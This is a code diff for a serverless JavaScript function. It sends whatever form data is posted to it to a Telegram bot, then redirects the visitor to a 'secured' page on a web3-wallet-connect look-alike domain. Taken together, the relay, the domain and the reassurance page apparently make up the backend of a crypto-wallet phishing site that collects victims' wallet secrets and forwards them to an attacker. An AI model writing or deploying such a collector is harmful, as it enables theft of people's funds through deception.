@@ -1,4 +1,3 @@
-// api/send-to-telegram.js
 const axios = require('axios');
 
 // Replace with your actual Telegram Bot Token
@@ -31,4 +30,22 @@ const sendToTelegram = async (data) => {
     }
 };
 
-module.exports = { sendToTelegram };
+// The default export must be a function that handles the HTTP request
+module.exports = async (req, res) => {
+    if (req.method === 'POST') {
+        try {
+            const data = req.body; // The form data sent in the POST request
+            const response = await sendToTelegram(data); // Send data to Telegram
+
+            // Redirect to the homepage after successful message sending
+            res.writeHead(302, { Location: 'https://web3walletconnect-omega.vercel.app/secured.html' }); // Redirect to homepage
+            res.end(); // End the response
+
+        } catch (error) {
+            console.error('Error in serverless function:', error);
+            res.status(500).json({ error: 'Failed to send message to Telegram' });
+        }
+    } else {
+        res.status(405).json({ error: 'Method Not Allowed' }); // Only allow POST requests
+    }
+};
